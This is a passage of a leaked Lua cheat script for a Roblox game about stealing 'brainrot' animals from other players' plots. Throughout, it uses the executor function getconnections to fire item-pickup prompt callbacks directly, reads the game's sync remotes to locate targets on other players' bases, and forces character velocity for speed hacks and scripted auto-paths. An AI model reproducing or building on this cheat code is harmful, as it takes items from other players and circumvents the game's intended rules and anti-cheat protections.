if isLocalRagdolled() then
GS.paused=true
pauseArmed=false
GS.progress=PAUSE_AT
GS.pauseTime=tick()
updateBar(PAUSE_AT,"STEALING")
return
else
pauseArmed=false
end
end

updateBar(prog,"STEALING")

if prog>=1 then
GS.active=false
GS.progress=0
GS.paused=false
pauseArmed=true
if GS.progressConn then GS.progressConn:Disconnect();GS.progressConn=nil end

for _,fn in ipairs(data.trigger) do
task.spawn(function() pcall(fn) end)
end

data.ready=true
updateBar(0,autoStealEnabled and "READY" or "IDLE")
end
end)

for _,fn in ipairs(data.hold) do
task.spawn(function() pcall(fn) end)
end
end

_G.SoundNormalAutoStealSetRadius=function(v)
GS.StealRadius=tonumber(v) or GS.StealRadius or 63
end

_G.SoundNormalAutoStealStart=function()
if GS.conn then GS.conn:Disconnect();GS.conn=nil end
GS.enabled=true
GS.StealRadius=tonumber(autoStealRadius) or 63
GS.StealDuration=1.3
GS.TriggerRadius=10
GS.conn=RunService.Heartbeat:Connect(function()
if not GS.enabled or GS.active then return end
if not autoStealEnabled or selectedStealMode~="Auto Steal V3" then return end
local prompt,spawnPart=findPrompt()
if prompt then execute(prompt,spawnPart) end
end)
updateBar(0,"READY")
end

_G.SoundNormalAutoStealStop=function()
GS.enabled=false
if GS.conn then GS.conn:Disconnect();GS.conn=nil end
if GS.progressConn then GS.progressConn:Disconnect();GS.progressConn=nil end
GS.active=false
GS.progress=0
GS.paused=false
GS.pauseTime=nil
GS.dataCache={}
updateBar(0,autoStealEnabled and "READY" or "IDLE")
end

_G.SoundNormalAutoStealSync=function()
if autoStealEnabled and selectedStealMode=="Auto Steal V3" then
_G.SoundNormalAutoStealStart()
else
_G.SoundNormalAutoStealStop()
end
end
end
_G.__SoundSetupNormalAutoSteal()
_G.__SoundSetupSemiAutoSteal = function()
local A = _G.SoundSemiSteal
if not A then
A = {
enabled = false,
conn = nil,
scanThread = nil,
syncReady = false,
plots = nil,
animalsData = {},
syncRemotes = nil,
plotSync = {caches = {}, connections = {}},
animals = {},
promptCache = {},
internalCache = {},
radius = 9,
primeRange = 80,
holdMin = 1.3,
holdMax = 2.6,
entryDelay = 0.3,
cooldown = 0.05,
state = {
active = false,
startTime = 0,
phase = "idle",
label = "",
lastResult = "",
lastResultTime = 0,
totalSteals = 0,
failedSteals = 0,
},
}
_G.SoundSemiSteal = A
end
local function rootPart()
local char = LP.Character
return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
end
local function barSet(pct, status)
pct = math.clamp(pct or 0, 0, 1)
--Leaked By Xlu0 AndPrime--
--Leaked By Xlu0 AndPrime--
if _G.StealBar then
    _G.StealBar.SetProgress(pct)
    _G.StealBar.SetState(status or "STEALING")
end
end
local function barReset()
if _G.StealBar then
    _G.StealBar.SetProgress(0)
    _G.StealBar.SetState(autoStealEnabled and "READY" or "IDLE")
end
end
local function splitSyncPath(path)
if typeof(path) == "table" then return path end
local out = {}
for part in string.gmatch(tostring(path), "[^%.]+") do table.insert(out, tonumber(part) or part) end
return out
end
local function resolveSyncPath(path, root)
local current, parent, key = root, nil, nil
for _, part in ipairs(splitSyncPath(path)) do
parent, key = current, part
current = current and current[part] or nil
end
return current, parent, key
end
local function applyPlotSyncDiff(channelName, packet)
local cache = A.plotSync.caches[channelName]
if typeof(cache) ~= "table" then return end
local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
local current, parent, key = resolveSyncPath(path, cache)
if action == "Changed" then
if parent ~= nil then parent[key] = a end
elseif action == "ArrayInsert" then
if current ~= nil then table.insert(current, b, a) end
elseif action == "ArrayRemoved" then
if current ~= nil then table.remove(current, b) end
elseif action == "DictionaryInsert" then
if current ~= nil then current[b] = a end
elseif action == "DictionaryRemoved" then
if current ~= nil then current[b] = nil end
end
end
local function attachPlotChannel(remote)
if not A.syncRemotes or A.plotSync.connections[remote] then return end
local channelName = tostring(remote.Name)
if not A.plots:FindFirstChild(channelName) then return end
if A.syncRemotes.requestData and A.plotSync.caches[channelName] == nil then
local ok, data = pcall(function() return A.syncRemotes.requestData:InvokeServer(channelName) end)
A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
elseif A.plotSync.caches[channelName] == nil then
A.plotSync.caches[channelName] = {}
end
A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
for _, packet in ipairs(queue) do applyPlotSyncDiff(channelName, packet) end
end)
end
local function ensureSync()
if A.syncReady then return true end
local ok = pcall(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
A.plots = workspace:WaitForChild("Plots")
local Packages = ReplicatedStorage:WaitForChild("Packages", 10)
local Datas = ReplicatedStorage:WaitForChild("Datas", 10)
if not Packages or not Datas then return end
A.animalsData = require(Datas:WaitForChild("Animals"))
local folder = Packages:WaitForChild("Synchronizer")
A.syncRemotes = {
channelFolder = folder:WaitForChild("Channel"),
routeRemote = folder:WaitForChild("CommunicationRoute"),
requestData = folder:FindFirstChild("RequestData"),
}
for _, child in ipairs(A.syncRemotes.channelFolder:GetChildren()) do
if child:IsA("RemoteEvent") then attachPlotChannel(child) end
end
A.syncRemotes.channelFolder.ChildAdded:Connect(function(child)
if child:IsA("RemoteEvent") then attachPlotChannel(child) end
end)
A.syncRemotes.routeRemote.OnClientEvent:Connect(function(actions)
for _, actionData in ipairs(actions) do
local kind, channelName = actionData[1], tostring(actionData[2])
if A.plots:FindFirstChild(channelName) then
if kind == "ListenerAdded" then
local remote = A.syncRemotes.channelFolder:FindFirstChild(channelName)
if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote) end
elseif kind == "ListenerRemoved" then
for remote, conn in pairs(A.plotSync.connections) do
if tostring(remote.Name) == channelName then
conn:Disconnect()
A.plotSync.connections[remote] = nil
A.plotSync.caches[channelName] = nil
break
end
end
end
end
end
end)
A.syncReady = true
end)
return ok and A.syncReady == true
end
local function getPlotOwner(plot)
local sign = plot and plot:FindFirstChild("PlotSign")
local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
local label = frame and frame:FindFirstChild("TextLabel")
if not label or label.Text == "Empty Base" then return nil end
return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
end
local function isMyBaseAnimal(animalData)
if not animalData or not animalData.plot or not A.plots then return false end
local plot = A.plots:FindFirstChild(animalData.plot)
if not plot then return false end
local owner = getPlotOwner(plot)
return owner == LP.DisplayName or owner == LP.Name
end
local function podiumFor(animalData)
local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
local podiums = plot and plot:FindFirstChild("AnimalPodiums")
return podiums and podiums:FindFirstChild(animalData.slot) or nil
end
local function animalPos(animalData)
local podium = podiumFor(animalData)
return podium and podium:GetPivot().Position or nil
end
local function distToAnimal(animalData)
local root = rootPart()
local pos = animalPos(animalData)
return root and pos and (root.Position - pos).Magnitude or math.huge
end
local function findPromptForAnimal(animalData)
if not animalData then return nil end
local cached = A.promptCache[animalData.uid]
if cached and cached.Parent then return cached end
local podium = podiumFor(animalData)
local base = podium and podium:FindFirstChild("Base")
local spawn = base and base:FindFirstChild("Spawn")
local attach = spawn and spawn:FindFirstChild("PromptAttachment")
if not attach then return nil end
for _, prompt in ipairs(attach:GetChildren()) do
if prompt:IsA("ProximityPrompt") then
A.promptCache[animalData.uid] = prompt
return prompt
end
end
return nil
end
local function scanAllPlots()
if not ensureSync() then return 0 end
local newCache = {}
for _, plot in ipairs(A.plots:GetChildren()) do
local cache = A.plotSync.caches[plot.Name]
local animalList = cache and cache.AnimalList
if typeof(animalList) == "table" then
for slot, animalData in pairs(animalList) do
if type(animalData) == "table" then
local animalName = animalData.Index
local info = A.animalsData and A.animalsData[animalName]
if info then
table.insert(newCache, {
name = info.DisplayName or animalName,
plot = plot.Name,
slot = tostring(slot),
uid = plot.Name .. "_" .. tostring(slot),
})
end
end
end
end
end
A.animals = newCache
return #newCache
end
local function pickClosest()
local root = rootPart()
if not root then return nil end
local best, bestDist = nil, math.huge
for _, animalData in ipairs(A.animals) do
if not isMyBaseAnimal(animalData) then
local pos = animalPos(animalData)
local dist = pos and (root.Position - pos).Magnitude or math.huge
if dist <= (A.primeRange or 80) and dist < bestDist then
best, bestDist = animalData, dist
end
end
end
return best
end
local function buildStealCallbacks(prompt)
if A.internalCache[prompt] then return end
local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
local ok1, conns1 = false, nil
if getconnections then ok1, conns1 = pcall(getconnections, prompt.PromptButtonHoldBegan) end
if ok1 and type(conns1) == "table" then
for _, conn in ipairs(conns1) do
if type(conn.Function) == "function" then table.insert(data.holdCallbacks, conn.Function) end
end
end
local ok2, conns2 = false, nil
if getconnections then ok2, conns2 = pcall(getconnections, prompt.Triggered) end
if ok2 and type(conns2) == "table" then
for _, conn in ipairs(conns2) do
if type(conn.Function) == "function" then table.insert(data.triggerCallbacks, conn.Function) end
end
end
if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then A.internalCache[prompt] = data end
end
local function executeCandySemi(prompt, animalData)
if not prompt or not prompt.Parent or not animalData then return false end
buildStealCallbacks(prompt)
local data = A.internalCache[prompt]
if not data or not data.ready then return false end
data.ready = false
local label = animalData.name or "Animal"
A.state.active = true
A.state.startTime = tick()
A.state.phase = "holding"
A.state.label = label
task.spawn(function()
for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
local holdStart = A.state.startTime
while A.enabled and selectedStealMode == "Semi" and tick() - holdStart < (A.holdMin or 1.3) do
barSet((tick() - holdStart) / (A.holdMax or 2.6), "STEALING")
task.wait()
end
A.state.phase = "waitingRange"
local alreadyInRange = distToAnimal(animalData) <= (tonumber(A.radius) or 9)
local fired = false
while A.enabled and selectedStealMode == "Semi" do
local elapsed = tick() - A.state.startTime
if elapsed > (A.holdMax or 2.6) or not prompt.Parent then break end
barSet(elapsed / (A.holdMax or 2.6), "WAITING RANGE")
if distToAnimal(animalData) <= (tonumber(A.radius) or 9) then
if not alreadyInRange then task.wait(A.entryDelay or 0.3) end
if A.enabled and selectedStealMode == "Semi" then
for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
pcall(function() if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end end)
fired = true
end
break
end
task.wait()
end
if fired then
A.state.totalSteals = (A.state.totalSteals or 0) + 1
A.state.lastResult = "Stole " .. label
A.state.phase = "success"
barSet(1, "SUCCESS")
else
A.state.failedSteals = (A.state.failedSteals or 0) + 1
A.state.lastResult = "Missed window: " .. label
A.state.phase = "failed"
barSet(1, "FAILED")
end
A.state.active = false
A.state.lastResultTime = tick()
task.wait(A.cooldown or 0.05)
data.ready = true
task.delay(0.8, function()
if not A.state.active then barReset() end
end)
end)
return true
end
local function ensureScanThread()
if A.scanThread then return end
A.scanThread = task.spawn(function()
while _G.SoundSemiSteal do
if A.enabled or selectedStealMode == "Semi" then pcall(scanAllPlots) end
task.wait(5)
end
end)
end
_G.SoundSemiAutoStealSetRadius = function(v)
local n = tonumber(v)
if n then A.radius = n end
end
_G.SoundSemiAutoStealStop = function()
A.enabled = false
if A.conn then A.conn:Disconnect(); A.conn = nil end
A.state.active = false
A.state.phase = "idle"
barReset()
end
_G.SoundSemiAutoStealStart = function()
A.radius = tonumber(autoStealRadius) or A.radius or 9
A.enabled = true
if not ensureSync() then return end
ensureScanThread()
pcall(scanAllPlots)
if A.conn then A.conn:Disconnect(); A.conn = nil end
A.conn = RunService.Heartbeat:Connect(function()
if not A.enabled then return end
if selectedStealMode ~= "Semi" then _G.SoundSemiAutoStealStop(); return end
if A.state.active then return end
local target = pickClosest()
if not target then return end
local prompt = A.promptCache[target.uid]
if not prompt or not prompt.Parent then prompt = findPromptForAnimal(target) end
if prompt then executeCandySemi(prompt, target) end
end)
end
_G.SoundSemiAutoStealSync = function()
if selectedStealMode == "Semi" and autoStealEnabled then
_G.SoundSemiAutoStealStart()
else
_G.SoundSemiAutoStealStop()
end
end
end
_G.__SoundSetupSemiAutoSteal()
_G.SoundAutoStealSync = function()
if not autoStealEnabled then
if _G.SoundNormalAutoStealStop then _G.SoundNormalAutoStealStop() end
if _G.SoundSemiAutoStealStop then _G.SoundSemiAutoStealStop() end
return
end
if selectedStealMode == "Auto Steal V3" then
if _G.SoundSemiAutoStealStop then _G.SoundSemiAutoStealStop() end
if _G.SoundNormalAutoStealSync then _G.SoundNormalAutoStealSync() end
elseif selectedStealMode == "Semi" then
if _G.SoundNormalAutoStealStop then _G.SoundNormalAutoStealStop() end
if _G.SoundSemiAutoStealSync then _G.SoundSemiAutoStealSync() end
end
end
task.spawn(function()
while task.wait(30) do
do end
end
end)
local lastMoveDir = Vector3.new(0, 0, 0)
local _moveDt = 1/60
local _speedActive = false
local _lastHorizSpeed = 0
local _actualSpeed = 0
local _lastPos = nil
local _lastPosT = 0
local _lastGroundNormalY = 1

local function getActiveMoveSpeed()
    if laggerCarryActive then return LAGGER_CARRY_SPEED
    elseif laggerModeEnabled then return LAGGER_SPEED
    elseif carrySpeedActive then return CS
    else return NS end
end

local function getCurrentSpeedValue()
    return getActiveMoveSpeed()
end

local function getAutoPathSpeed()
    if laggerModeEnabled then return LAGGER_SPEED
    else return NS end
end

local refreshSpeedModeRows = nil

local function syncCurrentSpeedMode()
    if laggerCarryActive then
        currentSpeedMode = "Lagger Carry"
    elseif laggerModeEnabled then
        currentSpeedMode = "Lagger"
    elseif carrySpeedActive then
        currentSpeedMode = "Carry"
    else
        currentSpeedMode = "Normal"
    end
end

local function refreshSpeedModeLabel()
    syncCurrentSpeedMode()
    if refreshSpeedModeRows then pcall(refreshSpeedModeRows) end
end

local function setSpeedMode(mode)
    if mode ~= "Normal" and mode ~= "Carry" and mode ~= "Lagger" and mode ~= "Lagger Carry" then
        mode = "Normal"
    end
    carrySpeedActive = (mode == "Carry")
    laggerModeEnabled = (mode == "Lagger")
    laggerCarryActive = (mode == "Lagger Carry")
    if mode == "Normal" then
        carrySpeedActive = false
        laggerModeEnabled = false
        laggerCarryActive = false
    end
    syncCurrentSpeedMode()
    if refreshSpeedModeRows then refreshSpeedModeRows() end
    if saveSoundConfig then pcall(saveSoundConfig) end
end

toggleCarryMode = function()
    carrySpeedActive = not carrySpeedActive
    if carrySpeedActive then
        laggerModeEnabled = false
        laggerCarryActive = false
    end
    refreshSpeedModeLabel()
    if saveSoundConfig then pcall(saveSoundConfig) end
end

toggleLaggerMode = function()
    laggerModeEnabled = not laggerModeEnabled
    if laggerModeEnabled then
        carrySpeedActive = false
        laggerCarryActive = false
    end
    refreshSpeedModeLabel()
    if saveSoundConfig then pcall(saveSoundConfig) end
end

toggleLaggerCarryMode = function()
    laggerCarryActive = not laggerCarryActive
    if laggerCarryActive then
        carrySpeedActive = false
        laggerModeEnabled = false
    end
    refreshSpeedModeLabel()
    if saveSoundConfig then pcall(saveSoundConfig) end
end

local function applyImpulseVel(part, targetVel)
    if not part or not part.Parent then return end
    pcall(function()
        local mass = part.AssemblyMass
        if not mass or mass ~= mass or mass <= 0 then mass = 1 end
        local current = part.AssemblyLinearVelocity
        local delta = targetVel - current
        part:ApplyImpulse(delta * mass)
    end)
end

local function applyVel(part, targetVel)
    applyImpulseVel(part, targetVel)
end

local function applyAngVel(part, targetAng)
    if not part or not part.Parent then return end
    pcall(function()
        local mass = part.AssemblyMass
        if not mass or mass <= 0 then mass = 1 end
        local current = part.AssemblyAngularVelocity
        local target = targetAng or Vector3.zero
        part:ApplyAngularImpulse((target - current) * mass * 0.35)
    end)
end

local function sampleGround(hrp)
    local ok, res = pcall(function()
        local origin = hrp.Position + Vector3.new(0, 2, 0)
        local params = RaycastParams.new()
        params.FilterType = Enum.RaycastFilterType.Exclude
        local char = hrp.Parent
        if char then params.FilterDescendantsInstances = {char} end
        params.IgnoreWater = true
        local hit = workspace:Raycast(origin, Vector3.new(0, -8, 0), params)
        if hit and hit.Normal then
            return {ny = hit.Normal.Y, grounded = (hit.Distance < 4.2)}
        end
        return {ny = 1, grounded = false}
    end)
    if ok and type(res) == "table" and type(res.ny) == "number" then
        _lastGroundNormalY = res.ny
        return res.ny, res.grounded == true
    end
    return _lastGroundNormalY, false
end

local function setSpeedConstraint(hrp, horizVel)
    if not hrp or not hrp.Parent then return end
    local hx, hz = horizVel.X, horizVel.Z
    local mag = math.sqrt(hx * hx + hz * hz)
    _lastHorizSpeed = mag
    _speedActive = mag > 0.05
    if mag < 0.05 then return end

    -- Set horizontal velocity exactly to target so actual speed matches NS/CS/LAGGER values
    pcall(function()
        local v = hrp.AssemblyLinearVelocity
        hrp.AssemblyLinearVelocity = Vector3.new(hx, v.Y, hz)
    end)
end

local function brakeHorizontal(hrp)
    if not hrp or not hrp.Parent then return end
    pcall(function()
        local ny, grounded = sampleGround(hrp)
        if not grounded then return end
        local v = hrp.AssemblyLinearVelocity
        local hx, hz = v.X, v.Z
        local hMag = math.sqrt(hx * hx + hz * hz)
        if hMag < 0.8 then
            if hMag > 0.05 then
                hrp.AssemblyLinearVelocity = Vector3.new(0, v.Y, 0)
            end
            return
        end
        local mass = hrp.AssemblyMass
        if not mass or mass ~= mass or mass <= 0 then mass = 1 end
        local target = Vector3.new(0, v.Y, 0)
        hrp:ApplyImpulse((target - v) * mass * 0.92)
    end)
end

local function applyCFrameMove(part, dirUnit, spd, dt)
    if not part or not part.Parent then return end
    if not dirUnit or dirUnit.Magnitude < 0.01 then return end
    _moveDt = dt or _moveDt
    setSpeedConstraint(part, Vector3.new(dirUnit.X, 0, dirUnit.Z).Unit * spd)
end

local function isRagdollState(hum)
    if not hum then return true end
    local st = hum:GetState()
    return hum.PlatformStand or st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll
end

State = State or {}
State.normalSpeed = NS
State.carrySpeed = CS
State.laggerSpeed = LAGGER_SPEED
State.speedToggled = (currentSpeedMode == "Carry" or currentSpeedMode == "Lagger Carry")
State.laggerEnabled = (currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry")
toggleRefs = toggleRefs or {}
function setCarry(on)
if on then
setSpeedMode("Carry")
else
if currentSpeedMode == "Carry" or currentSpeedMode == "Lagger Carry" then
setSpeedMode("Normal")
end
end
State.speedToggled = on == true
end
function setLagger(on)
if on then
setSpeedMode("Lagger")
else
if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
setSpeedMode("Normal")
end
end
State.laggerEnabled = on == true
end
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer
State = State or {}
State.normalSpeed = State.normalSpeed or 60
State.carrySpeed = State.carrySpeed or 30
State.laggerSpeed = State.laggerSpeed or 60
State.speedToggled = State.speedToggled or false
State.laggerEnabled = State.laggerEnabled or false
State._autoCarryFromSteal = State._autoCarryFromSteal or false
State._autoCarryGraceUntil = State._autoCarryGraceUntil or 0
State._waitingForCarryPickup = State._waitingForCarryPickup or false
State._carryPickupWatchUntil = State._carryPickupWatchUntil or 0
State._autoCarryReturnMode = State._autoCarryReturnMode or nil
toggleRefs = toggleRefs or {}
local function safeSaveConfig()
if type(saveSoundConfig) == "function" then
task.spawn(saveSoundConfig)
elseif type(saveConfig) == "function" then
task.spawn(saveConfig)
end
end
local function isCarryName(name)
    local n = tostring(name or ""):lower()
    return n:find("brainrot")
        or n:find("animal")
        or n:find("carry")
        or n:find("grab")
        or n:find("steal")
        or n:find("hold")
end

local function isIgnoredCarryTool(name)
    local n = tostring(name or ""):lower()
    return n:find("bat")
        or n:find("slap")
        or n:find("medusa")
        or n:find("head")
        or n:find("stone")
end

local function isCarryingBrainrot(char)
    if not char then return false end

    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end

    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            if child:FindFirstChildOfClass("Humanoid") and child:FindFirstChild("HumanoidRootPart") then
                return true
            end
            if isCarryName(child.Name) then
                return true
            end
        elseif child:IsA("Tool") and not isIgnoredCarryTool(child.Name) then
            return true
        end
    end

    return false
end

local function setCarrySpeedMode(on)
    State.speedToggled = on
    if toggleRefs.carryMode then
        toggleRefs.carryMode(on)
    end
    if type(setCarry) == "function" then
        setCarry(on)
    end
end

local function setLaggerMode(on)
    State.laggerEnabled = on
    if toggleRefs.laggerMode then
        toggleRefs.laggerMode(on)
    end
    if type(setLagger) == "function" then
        setLagger(on)
    end
end

local function enableCarrySpeedForSteal()
    State._waitingForCarryPickup = false
    State._carryPickupWatchUntil = 0

    if not State._autoCarryFromSteal then
        State._autoCarryReturnMode = currentSpeedMode
    end

    State._autoCarryFromSteal = true
    State._autoCarryGraceUntil = tick() + 0.75

    local wasLagger = (
        State._autoCarryReturnMode == "Lagger"
        or State._autoCarryReturnMode == "Lagger Carry"
        or currentSpeedMode == "Lagger"
        or currentSpeedMode == "Lagger Carry"
    )

    if wasLagger then
        State.laggerEnabled = true
        State.speedToggled = true
        if toggleRefs.laggerMode then toggleRefs.laggerMode(true) end
        if toggleRefs.carryMode then toggleRefs.carryMode(true) end
        setSpeedMode("Lagger Carry")
    else
        setLaggerMode(false)
        setCarrySpeedMode(true)
    end

    safeSaveConfig()
end

local function disableAutoCarrySpeed()
    if not State._autoCarryFromSteal and not State._waitingForCarryPickup then
        return
    end

    local wasAutoApplied = State._autoCarryFromSteal == true
    local returnMode = State._autoCarryReturnMode

    State._autoCarryFromSteal = false
    State._waitingForCarryPickup = false
    State._autoCarryGraceUntil = 0
    State._carryPickupWatchUntil = 0
    State._autoCarryReturnMode = nil

    if not wasAutoApplied then
        return
    end

    if returnMode == "Lagger" or returnMode == "Lagger Carry" then
        State.laggerEnabled = true
        State.speedToggled = false
        if toggleRefs.laggerMode then toggleRefs.laggerMode(true) end
        if toggleRefs.carryMode then toggleRefs.carryMode(false) end
        setSpeedMode("Lagger")
    elseif returnMode == "Carry" then
        State.laggerEnabled = false
        State.speedToggled = true
        if toggleRefs.laggerMode then toggleRefs.laggerMode(false) end
        if toggleRefs.carryMode then toggleRefs.carryMode(true) end
        setSpeedMode("Carry")
    else
        setLaggerMode(false)
        setCarrySpeedMode(false)
    end

    safeSaveConfig()
end

local function startAutoCarryPickupWatch(seconds)
    if autoCarrySpeedEnabled ~= true then return end
    State._waitingForCarryPickup = true
    State._carryPickupWatchUntil = tick() + (seconds or 1.25)
end

local _stealAttrWasActive = false
RunService.RenderStepped:Connect(function()
    if autoCarrySpeedEnabled ~= true then
        disableAutoCarrySpeed()
        return
    end

    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not char or not hum or not root then
        disableAutoCarrySpeed()
        _stealAttrWasActive = false
        return
    end

    local st = hum:GetState()
    local gotHit = st == Enum.HumanoidStateType.Physics
        or st == Enum.HumanoidStateType.Ragdoll
        or st == Enum.HumanoidStateType.FallingDown

    local stealingAttr = LP:GetAttribute("Stealing") == true
    local carryingBrainrot = isCarryingBrainrot(char)

    if stealingAttr and not _stealAttrWasActive then
        _stealAttrWasActive = true
        enableCarrySpeedForSteal()
    elseif not stealingAttr then
        _stealAttrWasActive = false
    end

    if State._waitingForCarryPickup then
        if gotHit or tick() > (State._carryPickupWatchUntil or 0) then
            State._waitingForCarryPickup = false
            State._carryPickupWatchUntil = 0
        elseif carryingBrainrot then
            enableCarrySpeedForSteal()
        end
    end

    if carryingBrainrot and not State._autoCarryFromSteal then
        enableCarrySpeedForSteal()
    end

    if State._autoCarryFromSteal then
        local graceDone = tick() > (State._autoCarryGraceUntil or 0)
        if gotHit or (graceDone and not carryingBrainrot and not stealingAttr) then
            disableAutoCarrySpeed()
        end
    end
end)

_G.AutoCarrySpeed = {
    IsCarryingBrainrot = isCarryingBrainrot,
    Enable = enableCarrySpeedForSteal,
    Disable = disableAutoCarrySpeed,
    WatchPickup = startAutoCarryPickupWatch,
}

_G.SoundAutoPathState = _G.SoundAutoPathState or {leftConn=nil,rightConn=nil,leftPhase=1,rightPhase=1}
_G.SoundAutoPathPoints = _G.SoundAutoPathPoints or {
L1=Vector3.new(-476.48,-6.28,92.73), L2=Vector3.new(-483.12,-4.95,94.80), LFace=Vector3.new(-482.25,-4.96,92.09),
R1=Vector3.new(-476.16,-6.52,25.62), R2=Vector3.new(-483.06,-5.03,25.48), RFace=Vector3.new(-482.06,-6.93,35.47),
}
function _G.SoundAutoPathSpeed()
if currentSpeedMode == "Lagger" or currentSpeedMode == "Lagger Carry" then
return LAGGER_SPEED
end
return NS
end
function _G.SoundStopAutoLeft()
local S=_G.SoundAutoPathState
if S.leftConn then S.leftConn:Disconnect(); S.leftConn=nil end
S.leftPhase=1
local char=LP.Character
local hum=char and char:FindFirstChildOfClass("Humanoid")
local hrp=char and char:FindFirstChild("HumanoidRootPart")
if hum then hum:Move(Vector3.zero,false) end
if hrp then hrp.AssemblyLinearVelocity=Vector3.new(0,hrp.AssemblyLinearVelocity.Y,0) end
end
function _G.SoundStopAutoRight()
local S=_G.SoundAutoPathState
if S.rightConn then S.rightConn:Disconnect(); S.rightConn=nil end
S.rightPhase=1
local char=LP.Character
local hum=char and char:FindFirstChildOfClass("Humanoid")
local hrp=char and char:FindFirstChild("HumanoidRootPart")
if hum then hum:Move(Vector3.zero,false) end
if hrp then hrp.AssemblyLinearVelocity=Vector3.new(0,hrp.AssemblyLinearVelocity.Y,0) end
end
function _G.SoundSetAutoLeft(on, skipSave)
if on and _G.SoundSafeModeTryStart and not _G.SoundSafeModeTryStart() then
autoLeftEnabled = false
if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
if not skipSave then do end end
return false
end
autoLeftEnabled = on and true or false
if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(autoLeftEnabled) end
if autoLeftEnabled then
autoRightEnabled=false
if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
if _G.SoundStopAutoRight then _G.SoundStopAutoRight() end
if _G.SoundStartAutoLeft then _G.SoundStartAutoLeft() end
else
if _G.SoundStopAutoLeft then _G.SoundStopAutoLeft() end
end
if not skipSave then do end end
end
function _G.SoundSetAutoRight(on, skipSave)
if on and _G.SoundSafeModeTryStart and not _G.SoundSafeModeTryStart() then
autoRightEnabled = false
if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
if not skipSave then do end end
return false
end
autoRightEnabled = on and true or false
if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(autoRightEnabled) end
if autoRightEnabled then
autoLeftEnabled=false
if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
if _G.SoundStopAutoLeft then _G.SoundStopAutoLeft() end
if _G.SoundStartAutoRight then _G.SoundStartAutoRight() end
else
if _G.SoundStopAutoRight then _G.SoundStopAutoRight() end
end
if not skipSave then do end end
end

--Leaked By Xlu0 AndPrime--
_G.SoundZombieMove = _G.SoundZombieMove or {
    leftConn = nil,
    rightConn = nil,
    leftPhase = 1,
    rightPhase = 1,
    attachment = nil,
    linearVelocity = nil,
}

_G.SoundAutoMoveSpeed = tonumber(_G.SoundAutoMoveSpeed) or 60
_G.SoundAutoMoveCarrySpeed = tonumber(_G.SoundAutoMoveCarrySpeed) or 30
_G.SoundDuelMode = (_G.SoundDuelMode == "full") and "full" or "half"

_G.SoundZombieMovePoints = _G.SoundZombieMovePoints or {
    L1 = Vector3.new(-476.48, -6.28, 92.73),
    L2 = Vector3.new(-483.12, -4.95, 94.80),
    LFace = Vector3.new(-482.25, -4.96, 92.09),

    R1 = Vector3.new(-476.16, -6.52, 25.62),
    R2 = Vector3.new(-483.06, -5.03, 25.48),
    RFace = Vector3.new(-482.06, -6.93, 35.47),

    FullLeft = {
        Vector3.new(-474.0, -7.3, 90.2),
        Vector3.new(-484.9, -5.1, 97.2),
        Vector3.new(-473.6, -7.3, 93.5),
        Vector3.new(-473.0, -7.3, 27.6),
        Vector3.new(-487.2, -5.3, 20.9),
    },

    FullRight = {
        Vector3.new(-472.5, -7.3, 30.9),
        Vector3.new(-483.8, -5.4, 25.5),
        Vector3.new(-472.4, -7.3, 30.5),
        Vector3.new(-472.0, -7.3, 93.6),
        Vector3.new(-482.8, -5.4, 97.8),
    }
}

-- Kecepatan Auto Left/Right ikut pengaturan (Normal Speed / Carry Speed / Lagger), bukan angka tetap 60/30
function _G.SoundGetAutoPathSpeed()
    if laggerModeEnabled then return tonumber(LAGGER_SPEED) or 29 end
    return tonumber(NS) or 60
end
function _G.SoundGetAutoPathCarrySpeed()
    if laggerModeEnabled then return tonumber(LAGGER_CARRY_SPEED) or 15 end
    return tonumber(CS) or 30
end

-- Wall slide: buang komponen kecepatan yang mengarah ke tembok supaya karakter
-- tidak naik / nempel di tembok saat didorong constraint (dipakai Auto Left/Right + Speed Boost)
_G.__SoundWallParams = RaycastParams.new()
_G.__SoundWallParams.FilterType = Enum.RaycastFilterType.Exclude
_G.__SoundWallParams.IgnoreWater = true
pcall(function() _G.__SoundWallParams.RespectCanCollide = true end)
_G.__SoundWallHeights = {-0.8, 0.8, 1.8}

function _G.SoundSlideAlongWall(hrp, vel)
    if not hrp or not hrp.Parent then return vel end
    local ok, result = pcall(function()
        local params = _G.__SoundWallParams
        params.FilterDescendantsInstances = {hrp.Parent}
        local v = Vector3.new(vel.X, 0, vel.Z)
        local reach = 2.4 + v.Magnitude * 0.03
        for _ = 1, 2 do
            if v.Magnitude < 0.01 then break end
